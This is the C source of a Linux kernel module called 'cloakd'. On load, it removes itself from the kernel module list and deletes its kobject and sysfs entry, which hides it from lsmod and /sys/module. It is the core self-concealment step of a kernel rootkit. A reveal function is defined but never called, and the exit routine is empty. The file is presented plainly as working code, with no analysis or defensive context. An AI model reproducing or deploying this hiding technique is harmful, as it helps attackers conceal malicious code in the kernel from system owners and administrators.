#include <linux/init.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("unixbeard");

struct cloakd_params 
{
	bool hidden;
	struct list_head *mod_before_me;
	struct list_head *mod_kobj_before_me;
};

static struct cloakd_params params = { 
	.hidden = false,
};
 
static void hide_itself(void)
{
	if (params.hidden)
		return;

	params.mod_before_me = THIS_MODULE->list.prev;
	params.mod_kobj_before_me = THIS_MODULE->mkobj.kobj.entry.prev;

	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);

	params.hidden = true;
	printk(KERN_DEBUG "cloakd is hidden");
}

static void reveal_itself(void)
{
	if (!params.hidden)
		return;

	list_add(&THIS_MODULE->list, params.mod_before_me);
	kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "cloakd");
	params.hidden = false;
}

static int __init cloakd_init(void)
{
	hide_itself();	
	return 0;
}

static void __exit cloakd_exit(void)
{}


module_init(cloakd_init);
module_exit(cloakd_exit);
